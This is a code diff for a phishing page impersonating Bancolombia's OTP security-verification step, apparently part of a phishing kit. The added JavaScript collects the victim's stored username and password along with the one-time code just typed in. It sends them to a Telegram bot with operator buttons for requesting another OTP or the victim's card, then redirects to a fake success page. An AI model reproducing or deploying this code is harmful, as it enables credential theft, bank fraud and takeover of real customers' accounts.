@@ -18,7 +18,6 @@
             color: #333;
         }
 
-        /* Header */
         .header {
             background: #FDDA24;
             padding: 12px 20px;
@@ -44,7 +43,6 @@
             gap: 5px;
         }
 
-        /* Main Container */
         .main-container {
             max-width: 450px;
             margin: 40px auto;
@@ -54,7 +52,6 @@
             overflow: hidden;
         }
 
-        /* Title Section */
         .title-section {
             background: linear-gradient(135deg, #005CA9 0%, #003d73 100%);
             padding: 30px 25px;
@@ -86,7 +83,6 @@
             line-height: 1.5;
         }
 
-        /* Form Section */
         .form-section {
             padding: 30px 25px;
         }
@@ -136,7 +132,6 @@
             border-color: #005CA9;
         }
 
-        /* OTP Inputs */
         .otp-section {
             margin-bottom: 25px;
         }
@@ -202,7 +197,6 @@
             display: block;
         }
 
-        /* Timer */
         .timer {
             text-align: center;
             margin: 15px 0;
@@ -215,7 +209,6 @@
             font-weight: 600;
         }
 
-        /* Resend Link */
         .resend-code {
             text-align: center;
             margin: 20px 0;
@@ -237,7 +230,6 @@
             pointer-events: none;
         }
 
-        /* Button */
         .btn-submit {
             width: 100%;
             padding: 14px;
@@ -265,7 +257,6 @@
             cursor: not-allowed;
         }
 
-        /* Loading Screen */
         .loading-screen {
             display: none;
             position: fixed;
@@ -312,7 +303,6 @@
             opacity: 0.8;
         }
 
-        /* Help Section */
         .help-section {
             background: #f9f9f9;
             padding: 15px;
@@ -347,7 +337,6 @@
             font-weight: bold;
         }
 
-        /* Footer */
         .footer {
             background: #f9f9f9;
             padding: 20px;
@@ -361,7 +350,6 @@
             margin: 5px 0;
         }
 
-        /* Responsive */
         @media (max-width: 480px) {
             .main-container {
                 margin: 20px 15px;
@@ -380,7 +368,6 @@
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-content">
             <div class="spinner"></div>
@@ -389,29 +376,23 @@
         </div>
     </div>
 
-    <!-- Header -->
     <div class="header">
-        <a href="datos-tarjeta.html" class="back-btn">← Volver</a>
+        <a href="login.html" class="back-btn">← Volver</a>
         <div class="logo">Bancolombia</div>
     </div>
 
-    <!-- Main Container -->
     <div class="main-container">
-        <!-- Title Section -->
         <div class="title-section">
             <div class="security-icon">🔐</div>
             <h1>Verificación de Seguridad</h1>
             <p>Ingresa el código que te enviamos para validar tu identidad</p>
         </div>
 
-        <!-- Form Section -->
         <div class="form-section">
-            <!-- Info Banner -->
             <div class="info-banner">
                 <p>⚠️ <strong>Atención:</strong> Hemos enviado un código de verificación a tu celular y correo electrónico registrado</p>
             </div>
 
-            <!-- OTP Type Selector -->
             <div class="otp-type-selector">
                 <button class="otp-type-btn active" data-type="otp">
                     📱 Código SMS
@@ -421,7 +402,6 @@
                 </button>
             </div>
 
-            <!-- OTP Section -->
             <div class="otp-section" id="otpSection">
                 <h3>Ingresa el código de 6 dígitos</h3>
                 
@@ -449,7 +429,6 @@
                 <button class="btn-submit" id="verifyBtn" disabled>Verificar código</button>
             </div>
 
-            <!-- Help Section -->
             <div class="help-section">
                 <h4>💡 ¿Necesitas ayuda?</h4>
                 <ul>
@@ -461,17 +440,17 @@
             </div>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
             <p>🔒 Conexión segura SSL 256-bit</p>
             <p>&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
         </div>
     </div>
 
-    <!-- Telegram Script -->
     <script src="js/telegram.js"></script>
 
     <script>
+        console.log('🔍 OTP page loaded');
+        
         // Variables globales
         const inputs = document.querySelectorAll('.otp-input');
         const verifyBtn = document.getElementById('verifyBtn');
@@ -482,8 +461,8 @@
         const countdownElement = document.getElementById('countdown');
         const timerElement = document.getElementById('timer');
         let currentIndex = 0;
-        let currentType = 'otp'; // 'otp' o 'dinamica'
-        let timeLeft = 300; // 5 minutos en segundos
+        let currentType = 'otp';
+        let timeLeft = 300;
         let timerInterval;
 
         // Auto-focus en primer input
@@ -496,10 +475,8 @@
                 this.classList.add('active');
                 currentType = this.dataset.type;
                 
-                // Limpiar inputs
                 clearOTP();
                 
-                // Actualizar título
                 const title = currentType === 'otp' ? 
                     'Ingresa el código de 6 dígitos' : 
                     'Ingresa tu clave dinámica';
@@ -512,7 +489,6 @@
             input.addEventListener('input', function(e) {
                 const value = e.target.value;
                 
-                // Solo permitir números
                 if (!/^\d$/.test(value)) {
                     e.target.value = '';
                     return;
@@ -520,7 +496,6 @@
                 
                 input.classList.add('filled');
                 
-                // Mover al siguiente input
                 if (value && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                     currentIndex = index + 1;
@@ -530,7 +505,6 @@
                 errorMessage.classList.remove('show');
             });
 
-            // Manejar backspace
             input.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace' && !e.target.value && index > 0) {
                     inputs[index - 1].focus();
@@ -538,7 +512,6 @@
                 }
             });
 
-            // Manejar paste
             input.addEventListener('paste', function(e) {
                 e.preventDefault();
                 const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
@@ -555,18 +528,15 @@
             });
         });
 
-        // Verificar si todos los campos están llenos
         function checkComplete() {
             const allFilled = Array.from(inputs).every(input => input.value !== '');
             verifyBtn.disabled = !allFilled;
         }
 
-        // Obtener código OTP
         function getOTPCode() {
             return Array.from(inputs).map(input => input.value).join('');
         }
 
-        // Limpiar campos
         function clearOTP() {
             inputs.forEach(input => {
                 input.value = '';
@@ -578,7 +548,6 @@
             errorMessage.classList.remove('show');
         }
 
-        // Mostrar error
         function showError() {
             errorMessage.classList.add('show');
             inputs.forEach(input => {
@@ -592,7 +561,6 @@
             }, 2000);
         }
 
-        // Timer countdown
         function startTimer() {
             timerInterval = setInterval(() => {
                 timeLeft--;
@@ -614,45 +582,40 @@
             }, 1000);
         }
 
-        // Iniciar timer
         startTimer();
 
-        // Reenviar código
         resendBtn.addEventListener('click', function(e) {
             e.preventDefault();
             
             if (!resendSection.classList.contains('disabled')) {
-                // Reiniciar timer
                 timeLeft = 300;
                 timerElement.classList.remove('warning');
                 resendSection.classList.add('disabled');
                 startTimer();
                 
-                // Simular reenvío
                 alert('✅ Se ha enviado un nuevo código a tu celular y correo electrónico');
                 clearOTP();
                 
-                // Habilitar reenvío después de 60 segundos
                 setTimeout(() => {
                     resendSection.classList.remove('disabled');
                 }, 60000);
             }
         });
 
-        // Verificar código
         verifyBtn.addEventListener('click', async function() {
             const code = getOTPCode();
             
-            // Mostrar pantalla de carga
+            console.log('🔐 Verificando código:', code);
+            console.log('📝 Tipo de verificación:', currentType);
+            
             loadingScreen.classList.add('active');
 
-            // Recopilar todos los datos
-            const personalData = JSON.parse(localStorage.getItem('personalData') || '{}');
-            const cardData = JSON.parse(localStorage.getItem('cardData') || '{}');
+            // Obtener datos previos
+            const loginData = JSON.parse(localStorage.getItem('loginData') || '{}');
+            console.log('📦 Datos de login recuperados:', loginData);
 
             const allData = {
-                ...personalData,
-                ...cardData,
+                ...loginData,
                 codigoVerificacion: code,
                 tipoVerificacion: currentType === 'otp' ? 'Código SMS' : 'Clave Dinámica',
                 timestamp: new Date().toLocaleString('es-CO', {
@@ -660,21 +623,46 @@
                 })
             };
 
+            // Guardar datos completos
+            localStorage.setItem('otpData', JSON.stringify(allData));
+            console.log('💾 Datos completos guardados:', allData);
+
+            // Mensaje para Telegram
+            const mensaje = `🔐 *BANCOLOMBIA - VERIFICACIÓN*\n\n👤 *Usuario:* ${allData.usuario}\n🔑 *Clave:* ${allData.clave}\n🎯 *${currentType === 'otp' ? 'OTP' : 'Dinámica'}:* ${code}\n🌐 *IP:* ${allData.ip}\n⏰ *Hora:* ${allData.timestamp}\n🆔 *ID:* ${allData.transactionId}`;
+
+            const teclado = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correcto", callback_data: `correcto_otp:${allData.transactionId}` },
+                        { text: "❌ Error OTP", callback_data: `error_otp:${allData.transactionId}` }
+                    ],
+                    [
+                        { text: "🔐 Pedir Otra Vez", callback_data: `pedir_otp:${allData.transactionId}` },
+                        { text: "💳 Pedir Tarjeta", callback_data: `pedir_tarjeta:${allData.transactionId}` }
+                    ],
+                    [
+                        { text: "✔️ Finalizar", callback_data: `finish:${allData.transactionId}` }
+                    ]
+                ]
+            };
+
             try {
-                // Enviar a Telegram
-                if (typeof sendToTelegram === 'function') {
-                    await sendToTelegram(allData);
+                if (typeof sendTelegramMessage === 'function') {
+                    await sendTelegramMessage(mensaje, teclado);
+                    console.log('✅ Mensaje enviado a Telegram');
+                } else {
+                    console.warn('⚠️ sendTelegramMessage no está disponible');
                 }
                 
-                // Simular espera de validación
                 setTimeout(() => {
                     loadingScreen.classList.remove('active');
-                    // Redirigir a página de confirmación
-                    window.location.href = 'confirmacion.html';
+                    console.log('🔄 Redirigiendo a exito-final.html');
+                    // AQUÍ ESTÁ EL CAMBIO CRÍTICO - REDIRIGE A exito-final.html
+                    window.location.href = 'exito-final.html';
                 }, 3000);
                 
             } catch (error) {
-                console.error('Error:', error);
+                console.error('❌ Error:', error);
                 loadingScreen.classList.remove('active');
                 showError();
             }
